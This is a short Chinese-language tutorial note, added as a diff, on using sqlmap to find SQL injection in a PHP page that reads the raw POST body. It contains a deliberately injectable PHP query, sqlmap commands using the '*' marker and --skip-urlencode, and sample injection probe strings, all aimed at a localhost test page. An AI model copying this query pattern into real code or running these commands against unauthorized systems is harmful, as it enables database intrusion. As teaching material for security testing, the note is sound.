@@ -1,0 +1,41 @@
+POST
+--forms (表单测试)
+-r (burtsuite)
+--data="id=1"
+====================================================================================
+php获取POST数据，整个post data就是一个id，没有参数之分。
+
+<?php
+$id = @file_get_contents('php://input');
+$pdo = new PDO("mysql:host=localhost;dbname=db","root","");
+$rs = $pdo -> query("SELECT * from sqltest WHERE id=$id");
+print_r($rs -> fetch());
+
+curl 'http://localhost/sqltest.php' -d '1'
+
+如果继续使用之前的--data命令：
+
+./sqlmap.py -u 'http://localhost/sqltest.php' --data="1"
+
+会提示错误，找不到可注入参数：
+[19:44:39] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+
+这个时候，需要用到sqlmap的星号（*）功能，mysql会对*这个位置进行不同攻击语句尝试，命令如下：
+./sqlmap.py -u 'http://localhost/sqltest.php' --data="*"
+
+但是，由于post数据是进行urlencode转义的，这样执行命令是找不到任何sql注入的，因为php获取到的id全部是这个样子的：
+%22%27%27%29%22%29%2C%27.%22
+%27rNyhQk%3C%27%22%3EooEVIZ
+%29%20AND%209882%3D7192%20AND%20%286634%3D6634
+%29%20AND%204081%3D4081%20AND%20%289304%3D9304
+%20AND%203492%3D7026
+%20AND%204081%3D4081
+
+这些语句拼接到数据库语句中，完全不能执行。
+
+正确的请求应该是加入一个省略url转义参数：
+
+./sqlmap.py -u 'http://localhost/sqltest.php' --data="*" --skip-urlencode
+
+此时，就可以找到sql注入点了。
+====================================================================================
